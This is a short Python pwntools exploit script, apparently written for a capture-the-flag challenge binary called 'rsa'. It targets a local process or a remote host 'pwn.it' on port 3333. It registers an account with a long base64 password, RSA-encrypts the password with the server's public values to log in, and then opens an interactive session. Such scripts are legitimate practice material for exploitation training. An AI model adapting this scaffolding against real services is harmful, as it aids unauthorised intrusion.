#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
import base64
import gmpy2

context.log_level="debug"
pwn_file="./rsa"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

def create(password,size=0):
    r.sendlineafter("login\n","1")
    data = base64.b64encode(password)
    if size == 0:
        size = len(data)
    r.sendlineafter("how long about your password(send by base64)\n",str(size))
    r.sendafter("give me password\n",data)

def login(idx,password):
    r.sendlineafter("login\n","4")
    r.sendlineafter("index\n",str(idx))
    r.recvuntil("password is\n")
    p = int(r.recvline())
    r.recvuntil("e:\n")
    e = int(r.recvline())
    r.recvuntil("n:\n")
    n = int(r.recvline())
    data = "%x"%(pow(int(password.encode("hex"),16),e,n))
    send = ((len(data)%2)*"0" + data).decode("hex")
    r.sendafter("give me your password",base64.b64encode(send))

create("a"*0x100)
debug()
login(0,"a"*0x100)
r.interactive()




